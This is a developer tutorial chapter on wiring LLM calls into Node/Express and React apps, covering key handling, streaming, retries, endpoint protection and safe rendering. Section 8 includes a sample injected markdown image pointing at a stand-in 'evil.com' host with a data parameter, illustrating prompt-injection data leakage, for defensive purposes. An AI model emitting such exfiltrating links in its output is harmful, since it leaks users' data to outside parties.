# AI Engineering Notes — Part 12

## LLM Apps in Node & React (the full-stack part) ⭐⭐⭐⭐⭐

**Topics:** where the LLM call lives · keeping API keys safe · calling an LLM from Node/TypeScript · streaming from Express to React · cancelling · structured output with zod · errors, 429s, retries, timeouts · protecting your endpoint (auth, rate limits, budgets) · storing conversations · rendering model output safely · AI UX · the Vercel AI SDK.

> The rest of the track explains *what* to build; this part is *how* a full-stack developer wires it up. Plain SDK + Express + React — no extra frameworks needed.

---

## 1. The one rule

> **The browser never talks to the LLM provider. Your server does.** The server holds the key, checks the user, builds the prompt, calls the model, and streams the answer back.

```
React  ──POST /api/chat──►  Node (auth, rate limit, build prompt, RAG)  ──►  LLM API
       ◄──── streamed text ────                                         ◄── stream
```

Why not call the API from the browser? Anyone can read the key from the bundle or network tab and use it on your bill. **Never put a provider key in front-end code or a `VITE_` / `NEXT_PUBLIC_` env variable.**

---

## 2. A basic call (Node + TypeScript)

```ts
// npm i openai   (Anthropic, Google etc. have very similar SDKs)
import OpenAI from 'openai';

const openai = new OpenAI({                 // reads OPENAI_API_KEY from env by default
  timeout: 30_000,                          // don't hang forever
  maxRetries: 2,                            // SDK retries 429 / 5xx / network errors with backoff
});
const MODEL = process.env.LLM_MODEL!;       // config, not hard-coded — models change often

export async function summarise(text: string) {
  const res = await openai.chat.completions.create({
    model: MODEL,
    temperature: 0.2,
    max_tokens: 300,
    messages: [
      { role: 'system', content: 'Summarise the text in 3 bullet points.' },
      { role: 'user', content: `<text>${text}</text>` },
    ],
  });
  return res.choices[0]?.message.content ?? '';
}
```

Also check `finish_reason` — `"length"` means the answer was cut off by `max_tokens`.

---

## 3. ⭐ Streaming from Express to React

LLMs generate token by token; waiting 10 s for a full answer feels broken. Stream it.

### Server — stream plain text

```ts
app.post('/api/chat', requireAuth, chatRateLimit, async (req, res) => {
  const { messages } = ChatBody.parse(req.body);           // validate the body (zod)

  const controller = new AbortController();
  res.on('close', () => controller.abort());               // user left / clicked Stop → stop paying

  try {
    const stream = await openai.chat.completions.create(
      { model: MODEL, messages: [{ role: 'system', content: SYSTEM }, ...messages], stream: true },
      { signal: controller.signal },
    );

    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    for await (const chunk of stream) {
      const text = chunk.choices[0]?.delta?.content;
      if (text) res.write(text);
    }
    res.end();
  } catch (err) {
    if (controller.signal.aborted) return;                 // client went away — nothing to send
    if (!res.headersSent) res.status(502).json({ error: 'AI service unavailable' });
    else res.end();                                         // already streaming — just close
  }
});
```

### Client — read the stream

```tsx
async function send(messages: Msg[], onText: (t: string) => void, signal: AbortSignal) {
  const res = await fetch('/api/chat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ messages }),
    signal,                                                   // Stop button → controller.abort()
  });
  if (!res.ok || !res.body) throw new Error(`HTTP ${res.status}`);

  const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
  while (true) {
    const { value, done } = await reader.read();
    if (done) break;
    onText(value);                                            // append to the last message in state
  }
}
```

- `EventSource` only does GET, so for POST you use `fetch` + a stream reader.
- **Plain text is enough** for "just the answer." Use **SSE format** (`data: {...}\n\n` events) when you also need to send **structured events** — sources, tool progress, errors, a final "done" with token usage.
- Proxies (nginx) may **buffer** responses — disable buffering for this route (`X-Accel-Buffering: no`).
- WebSockets also work, but HTTP streaming is simpler for request → streamed reply ([nodejs Part 13](../nodejs/13-websockets-and-socketio.md)).

> 🧠 **Remember:** **stream for UX, abort to save money.** When the user leaves, stop the upstream request.

---

## 4. Structured output with zod

```ts
import { zodResponseFormat } from 'openai/helpers/zod';

const Ticket = z.object({
  category: z.enum(['billing', 'bug', 'feature', 'other']),
  urgency: z.enum(['low', 'medium', 'high']),
  summary: z.string(),
});

const res = await openai.chat.completions.parse({          // SDK helper: schema in, parsed object out
  model: MODEL,
  messages: [{ role: 'system', content: 'Classify the support ticket.' }, { role: 'user', content: text }],
  response_format: zodResponseFormat(Ticket, 'ticket'),
});
const ticket = res.choices[0]?.message.parsed;              // typed as z.infer<typeof Ticket> | null
if (!ticket) { /* refusal or failure → fallback */ }
```

(Helper names differ by SDK and version; the idea is the same everywhere: **zod schema → strict structured output → parsed, typed result → still handle failure.** See [Part 02 §6](02-prompt-engineering-and-structured-output.md).)

---

## 5. Errors, limits and retries

| Error | Meaning | What to do |
|---|---|---|
| **429** rate limit | too many requests/tokens per minute | retry with **exponential backoff + jitter** (SDKs do it); queue bulk jobs |
| **5xx / overloaded** | provider trouble | retry a little, then **fallback** (another model/provider) or a friendly error |
| **400** context too long | prompt + max_tokens > window | trim history / fewer chunks |
| **timeout** | slow response | set timeouts; stream so users see progress |
| **content refusal** | the model declined | show a clear message, don't retry blindly |

Rate limits are **per organisation and per model** (requests/min and tokens/min). Bulk work (summarising 10k docs) belongs in a **background queue** with controlled concurrency ([nodejs Part 12](../nodejs/12-background-jobs-and-scheduling.md)), or the provider's cheaper **batch API**.

---

## 6. ⭐ Protecting your endpoint

Your `/api/chat` spends money on every call. Protect it like a payment endpoint:

- **Authentication** — logged-in users only (or strict limits for anonymous).
- **Rate limit per user** — requests/min and **tokens or cost per day** ([System-design Part 23](../System-design/23-rate-limiting.md)).
- **Validate input** — max message length, max history length, allowed roles. **Never accept a `system` message from the client** — the server owns the system prompt.
- **Set `max_tokens`** on every call.
- **Budget alerts** in the provider dashboard + your own usage logging per user.

---

## 7. Conversations & state

- The model is stateless — **store conversations in your DB** (`conversations`, `messages` with role, content, tokens, model, prompt version, timestamps).
- Each turn, the **server loads the history from the DB** (don't trust a client-sent history for anything security-relevant), trims it to fit, adds RAG context, calls the model, and saves the reply.
- Long chats → keep the last N messages + a running summary ([Part 13](13-memory-and-multi-agent.md)).

---

## 8. Rendering model output safely

- Model output is **untrusted text** — it can contain HTML or links injected via documents or users.
- Render Markdown with a library that **doesn't allow raw HTML** (e.g. `react-markdown` without `rehype-raw`), or sanitise with **DOMPurify**. Never `dangerouslySetInnerHTML` raw model output → **XSS**.
- Be careful auto-loading **images/links** from model output — an injected `![](https://evil.com/?data=…)` can leak data through the URL ([Part 15](15-ai-security.md)).

---

## 9. AI UX checklist

- **Stream** the answer; show a "thinking…" state before the first token.
- **Stop** button (abort) and **Regenerate**.
- **Show sources** with links for RAG answers.
- **Thumbs up/down** feedback → stored with the trace ([Part 14](14-evaluation-and-observability.md)).
- **Clear errors** ("The assistant is busy, try again") — never a raw stack trace.
- **Set expectations** — "AI can make mistakes"; confirm before actions ("Send this email?").
- **Optimistic UI** for the user's own message; keep the input usable.

---

## 10. The Vercel AI SDK (optional shortcut)

The `ai` package gives one API over many providers (`streamText`, `generateObject` with zod, tool calling with multi-step loops) and React hooks (`useChat`) that handle the streaming protocol, message state, stop and retry. It saves a lot of the plumbing above, especially in Next.js.

Use it if your team likes it; the concepts are identical. Its API changes between major versions — check the docs for the version you're on.

---

## Interview Q&A

**Q: Why shouldn't the front-end call the OpenAI/Anthropic API directly?**
> The API key would be visible to anyone, who could then run up your bill. The server keeps the key and also does what the browser can't be trusted with: authentication, rate limiting, the system prompt, RAG retrieval with tenant filters, and logging.

**Q: How do you stream an LLM response to a React app?**
> The server calls the model with streaming on and writes each text chunk to the HTTP response. The client uses `fetch` and reads `response.body` with a stream reader, appending text to state as it arrives. An AbortController lets the user stop it, and the server aborts the upstream call when the connection closes. For extra events like sources, I'd use the SSE format.

**Q: How do you handle rate limits from the LLM provider?**
> Retries with exponential backoff and jitter for 429s — SDKs do this by default — plus timeouts. For bulk work, a queue with limited concurrency or the batch API. For user-facing traffic, per-user limits on my own endpoint so one user can't use up the shared quota, and a fallback model if the provider is down.

**Q: How do you protect an AI chat endpoint from abuse?**
> Require auth, rate limit per user by requests and by tokens or cost, validate and cap input size, never accept a system prompt from the client, set `max_tokens`, and monitor spend per user with alerts.

**Q: Is it safe to render the model's Markdown as HTML?**
> Only if raw HTML is disabled or the output is sanitised. Model output can contain injected HTML or tracking image links, so I treat it as untrusted user content.

---

## Follow-ups (challenge questions)

- *Failure mode:* users close the tab mid-answer, but your token bill shows full-length answers for those requests. What's missing on the server?
- *Scale:* a marketing campaign brings 50× traffic and the provider returns 429s for everyone. What should the system do in the first minute, and what should you build afterwards?

---

## Cheat Sheet

```
browser → YOUR server → LLM · key server-side only (never VITE_/NEXT_PUBLIC_)
SDK: timeout + maxRetries · model from config · max_tokens · check finish_reason
STREAM: server for-await chunks → res.write · client fetch + body.getReader() · SSE format for events
  res.on('close') → abort upstream · disable proxy buffering
structured: zod schema → strict output → parsed + handle null/refusal
errors: 429 → backoff+jitter · 5xx → retry then fallback · too long → trim · bulk → queue / batch API
PROTECT: auth · per-user rate + token/cost limits · cap input · server owns system prompt · alerts
state: conversations in DB · server loads history · trim + summary
render: no raw HTML / DOMPurify · careful with links/images
UX: stream · stop · regenerate · sources · feedback · friendly errors · confirm actions
Vercel AI SDK = optional shortcut (streamText, generateObject, useChat)
```

---

**Previous:** [Part 11 — MCP](11-mcp.md) · **Next:** [Part 13 — Memory & Multi-Agent Systems](13-memory-and-multi-agent.md)
